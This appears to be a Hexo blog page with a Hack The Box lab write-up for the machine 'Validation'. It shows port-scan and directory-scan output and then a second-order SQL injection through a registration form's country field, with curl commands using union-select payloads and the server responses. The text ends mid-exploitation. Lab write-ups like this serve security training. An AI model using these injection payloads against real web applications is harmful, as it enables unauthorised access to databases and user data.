@@ -1,0 +1,723 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:1234567Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 01:08:15 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 4566&#x2F;tcp on 10.10.11.116">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Validation">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Validation.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="Recon:1234567Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 01:08:15 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 4566&#x2F;tcp on 10.10.11.116">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517091418820.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092003010.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092119745.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092247200.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092643337.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.052Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.040Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517091418820.png">
+  
+  
+  
+  <title>HTB Walkthrough - Validation - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Validation"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          124 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Validation</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 01:08:15 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 4566/tcp on 10.10.11.116                                  </span><br><span class="line">Discovered open port 80/tcp on 10.10.11.116                                    </span><br><span class="line">Discovered open port 22/tcp on 10.10.11.116                                    </span><br><span class="line">Discovered open port 8080/tcp on 10.10.11.116 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.116</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)</span><br><span class="line">|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)</span><br><span class="line">|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.48 ((Debian))</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; charset=UTF-8).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.48 (Debian)</span></span><br><span class="line"><span class="string">4566/tcp open  http    nginx</span></span><br><span class="line"><span class="string">|_http-title: 403 Forbidden</span></span><br><span class="line"><span class="string">8080/tcp open  http    nginx</span></span><br><span class="line"><span class="string">|_http-title: 502 Bad Gateway</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 23.32 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>一个注册页面：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517091418820.png" srcset="/img/loading.gif" lazyload alt="image-20220517091418820"  />
+
+<p>添加之后会回显在页面：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092003010.png" srcset="/img/loading.gif" lazyload alt="image-20220517092003010"  />
+
+<p>如果在同一个地点添加不一样的用户名也会回显：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092119745.png" srcset="/img/loading.gif" lazyload alt="image-20220517092119745"  />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; dirsearch -u http://validation.htb/ -e php</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940</span><br><span class="line">[09:18:48] 403 -  279B  - /.htpasswds</span><br><span class="line">[09:18:48] 403 -  279B  - /.httr-oauth</span><br><span class="line">[09:18:49] 403 -  279B  - /.htpasswd_test</span><br><span class="line">[09:19:01] 200 -   16B  - /account.php</span><br><span class="line">[09:19:14] 200 -    0B  - /config.php</span><br><span class="line">[09:19:17] 301 -  314B  - /css  -&gt;  http://validation.htb/css/</span><br><span class="line">[09:19:25] 200 -   16KB - /index.php</span><br><span class="line">[09:19:25] 200 -   16KB - /index.php/login/</span><br><span class="line">[09:19:26] 403 -  279B  - /js/</span><br><span class="line">[09:19:26] 301 -  313B  - /js  -&gt;  http://validation.htb/js/</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092247200.png" srcset="/img/loading.gif" lazyload alt="image-20220517092247200"  />
+
+<p>config读取不出来，login与index一样，只是没有了渲染。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>validation.htb</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://validation.htb</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://validation.htb/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=ca28b722bc10aa4b3beb941d5ca220ca</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">username</span>=admin&amp;country=Brazil</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="SQLi："><a href="#SQLi：" class="headerlink" title="SQLi："></a>SQLi：</h4><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092643337.png" srcset="/img/loading.gif" lazyload alt="image-20220517092643337"/>
+
+<p>无论如何更改参数服务器都会响应一个set cookie，如果在Country后边添加一个单引号，服务器一样会返回一个cookie，但是如果用它返回的cookie当作用户名，服务端会返回一些报错信息：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container p-5&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;text-white&quot;</span>&gt;</span>Welcome 21232f297a57a5a743894a0e4a801fc3&#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;text-white&quot;</span>&gt;</span>Other Players In Brazil&#x27;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Fatal error<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/html/account.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>33</span><br></pre></td></tr></table></figure>
+
+<p>为验证这个猜想，我在单引号后边又添加了注释：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v -d &quot;username=hack&amp;country=Brazil&#x27;-- -&quot; http://validation.htb            </span><br><span class="line">*   Trying 10.10.11.116:80...</span><br><span class="line">* Connected to validation.htb (10.10.11.116) port 80 (#0)</span><br><span class="line">&gt; POST / HTTP/1.1</span><br><span class="line">&gt; Host: validation.htb</span><br><span class="line">&gt; User-Agent: curl/7.83.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 32</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 302 Found</span><br><span class="line">&lt; Date: Tue, 17 May 2022 01:49:16 GMT</span><br><span class="line">&lt; Server: Apache/2.4.48 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.4.23</span><br><span class="line">&lt; Set-Cookie: user=d78b6f30225cdc811adfe8d4e7c9fd34</span><br><span class="line">&lt; Location: /account.php</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host validation.htb left intact</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v --cookie &quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot; http://validation.htb/account.php</span><br><span class="line">*   Trying 10.10.11.116:80...</span><br><span class="line">* Connected to validation.htb (10.10.11.116) port 80 (#0)</span><br><span class="line">&gt; GET /account.php HTTP/1.1</span><br><span class="line">&gt; Host: validation.htb</span><br><span class="line">&gt; User-Agent: curl/7.83.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Cookie: user=d78b6f30225cdc811adfe8d4e7c9fd34</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Tue, 17 May 2022 01:50:54 GMT</span><br><span class="line">&lt; Server: Apache/2.4.48 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.4.23</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 762</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">&lt;link href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;</span><br><span class="line">&lt;script src=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!------ Include the above in your HEAD tag ----------&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;h1 class=&quot;text-center m-5&quot;&gt;Join the UHC - September Qualifiers&lt;/h1&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;section class=&quot;bg-dark text-center p-5 mt-4&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;container p-5&quot;&gt;</span><br><span class="line">            &lt;h1 class=&quot;text-white&quot;&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=&quot;text-white&quot;&gt;Other Players In Brazil&#x27;-- &lt;/h3&gt;&lt;li class=&#x27;text-white&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;text-white&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;text-white&#x27;&gt;admin&lt;/li&gt;		&lt;/div&gt;</span><br><span class="line">	&lt;/section&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">* Connection #0 to host validation.htb left intact</span><br></pre></td></tr></table></figure>
+
+<p>这次并没有报错，这似乎是一个二次注入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v -d &quot;username=hack&amp;country=Brazil&#x27;union select 1--+&quot; http://validation.htb</span><br><span class="line">*   Trying 10.10.11.116:80...</span><br><span class="line">* Connected to validation.htb (10.10.11.116) port 80 (#0)</span><br><span class="line">&gt; POST / HTTP/1.1</span><br><span class="line">&gt; Host: validation.htb</span><br><span class="line">&gt; User-Agent: curl/7.83.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 46</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 302 Found</span><br><span class="line">&lt; Date: Tue, 17 May 2022 01:55:16 GMT</span><br><span class="line">&lt; Server: Apache/2.4.48 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.4.23</span><br><span class="line">&lt; Set-Cookie: user=d78b6f30225cdc811adfe8d4e7c9fd34</span><br><span class="line">&lt; Location: /account.php</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host validation.htb left intact</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v --cookie <span class="string">&quot;user=21232f297a57a5a743894a0e4a801fc3&quot;</span> http://validation.htb/account.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">id</span>=<span class="string">&quot;bootstrap-css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!------ Include the above in your HEAD tag ----------&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;text-center m-5&quot;</span>&gt;</span>Join the UHC - September Qualifiers<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container p-5&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;text-white&quot;</span>&gt;</span>Welcome admin<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;text-white&quot;</span>&gt;</span>Other Players In Belgium&#x27; union select 1-- -<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&#x27;text-white&#x27;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">* Connection #0 to host validation.htb left intact</span><br></pre></td></tr></table></figure>
+
+<p>看起来有回显。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v -d <span class="string">&quot;username=hack&amp;country=Brazil&#x27;union select user()--+&quot;</span> http://validation.htb</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v --cookie <span class="string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php</span><br></pre></td></tr></table></figure>
+
